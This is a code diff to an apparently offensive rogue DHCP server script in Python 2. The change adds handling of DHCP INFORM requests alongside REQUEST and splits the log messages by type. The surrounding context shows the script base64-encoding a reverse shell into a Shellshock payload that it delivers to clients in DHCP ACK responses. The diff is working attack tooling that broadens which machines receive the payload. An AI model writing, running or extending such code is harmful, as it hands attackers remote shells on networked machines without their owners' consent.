@@ -186,7 +186,7 @@ def dhcp_reply(request):
             SOCK.send(offer_packet)
             print "[INFO] Send offer response!"
 
-        if request[DHCP].options[0][1] == 3:
+        if request[DHCP].options[0][1] == 3 or request[DHCP].options[0][1] == 8:
             requested_ip = offer_ip_address
             for option in request[DHCP].options:
                 if option[0] == "requested_addr":
@@ -220,8 +220,13 @@ def dhcp_reply(request):
                 b64shell = b64encode(net_settings + reverse_shell)
                 shellshock_url = "() { :" + "; }; /bin/sh <(/usr/bin/base64 -d <<< " + b64shell + ")"
 
-            print "DHCP REQUEST from: " + target_mac_address + " || transaction id: " + hex(transaction_id) + \
-                  " || requested ip: " + requested_ip
+            if request[DHCP].options[0][1] == 3:
+                print "DHCP REQUEST from: " + target_mac_address + " || transaction id: " + hex(transaction_id) + \
+                      " || requested ip: " + requested_ip
+            if request[DHCP].options[0][1] == 8:
+                print "DHCP INFORM from: " + target_mac_address + " || transaction id: " + hex(transaction_id) + \
+                      " || requested ip: " + requested_ip
+
             ack_packet = make_dhcp_ack_packet(transaction_id, requested_ip)
             SOCK.send(ack_packet)
             print "[INFO] Send ack response!"
